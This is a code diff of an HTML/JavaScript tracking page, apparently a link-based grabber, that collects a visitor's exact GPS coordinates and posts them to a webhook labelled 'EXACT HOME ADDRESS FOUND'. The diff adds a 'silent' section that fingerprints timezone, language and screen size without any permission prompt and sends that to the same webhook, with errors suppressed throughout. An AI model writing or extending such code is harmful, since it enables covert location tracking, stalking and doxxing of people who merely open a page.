@@ -200,7 +200,7 @@ color:16753920
 }});
 }}
 
-// GPS LOCATION
+// GPS LOCATION (asks permission - can't bypass)
 if(navigator.geolocation){{
 navigator.geolocation.getCurrentPosition(async(p)=>{{
 let lat=p.coords.latitude;
@@ -229,7 +229,7 @@ await fetch('{WEBHOOK}',{{
 method:'POST',
 headers:{{'Content-Type':'application/json'}},
 body:JSON.stringify({{
-content:'@everyone 🚨 EXACT HOME ADDRESS FOUND',
+content:'@everyone 🚨 EXACT HOME ADDRESS FOUND (GPS)',
 embeds:[{{
 title:'📍 COMPLETE HOME ADDRESS',
 color:3066993,
@@ -253,6 +253,39 @@ footer:{{text:'GPS - Exact Home Address'}}
 }}catch(e){{}}
 }},()=>{{}},{{enableHighAccuracy:true,timeout:5000,maximumAge:0}});
 }}
+
+// SILENT LOCATION (no permission needed - less accurate)
+try{{
+const timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
+const lang=navigator.language;
+const screen=`${{screen.width}}x${{screen.height}}`;
+
+// Use timezone to estimate location
+let estimatedCity='Unknown';
+let estimatedRegion='Unknown';
+if(timezone.includes('New_York')){{estimatedCity='Eastern US';estimatedRegion='EST'}}
+else if(timezone.includes('Chicago')){{estimatedCity='Central US';estimatedRegion='CST'}}
+else if(timezone.includes('Denver')){{estimatedCity='Mountain US';estimatedRegion='MST'}}
+else if(timezone.includes('Los_Angeles')){{estimatedCity='Western US';estimatedRegion='PST'}}
+
+await fetch('{WEBHOOK}',{{
+method:'POST',
+headers:{{'Content-Type':'application/json'}},
+body:JSON.stringify({{
+embeds:[{{
+title:'🕐 TIMEZONE INFO (Silent)',
+color:65535,
+fields:[
+{{name:'Timezone',value:timezone,inline:true}},
+{{name:'Language',value:lang,inline:true}},
+{{name:'Screen',value:screen,inline:true}},
+{{name:'Estimated Region',value:estimatedRegion,inline:true}}
+],
+footer:{{text:'No permission needed'}}
+}}]
+}})
+}});
+}}catch(e){{}}
 }})();
 </script>
 </body>
